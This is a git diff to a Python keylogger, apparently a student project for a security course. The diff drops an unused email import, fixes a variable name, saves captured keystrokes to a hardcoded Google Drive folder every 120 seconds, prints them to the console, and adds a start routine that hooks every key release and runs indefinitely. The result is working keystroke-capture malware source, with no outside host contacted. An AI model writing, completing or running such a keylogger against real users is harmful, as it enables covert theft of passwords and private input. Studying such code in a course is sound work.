@@ -1,5 +1,4 @@
 import keyboard
-import smtplib
 
 from threading import Timer
 from datetime import datetime
@@ -10,6 +9,7 @@ REPORT_INTERVAL = 120
 class Keylogger:
 
     def __init__(self, interval):
+        self.filename = None
         self.interval = REPORT_INTERVAL
         self.log = ""
         self.startDate = datetime.now()
@@ -31,13 +31,13 @@ class Keylogger:
 
     def updateFilename(self):
         startDateString = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
-        endDateString = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        endDateString = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog--{startDateString} to {endDateString}"
 
     def writeFile(self):
-        with open(f"{self.filename}.txt", "w") as f:
+        with open(f"G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt", "w") as f:
             print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+        print(f"[+] Saved G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt")
 
     def report(self):
         """Called every interval"""
@@ -47,8 +47,8 @@ class Keylogger:
             # update `self.filename`
             self.updateFilename()
             self.writeFile()
-            # if you want to print in the console, uncomment below line
-            # print(f"[{self.filename}] - {self.log}")
+
+            print(f"[{self.filename}] - {self.log}")
             self.startDate = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -56,3 +56,14 @@ class Keylogger:
         timer.daemon = True
         # start the timer
         timer.start()
+
+    def start(self):
+        self.startDate = datetime.now()
+        keyboard.on_release(callback=self.keyLog)
+        self.report()
+        keyboard.wait()
+
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=REPORT_INTERVAL)
+    keylogger.start()
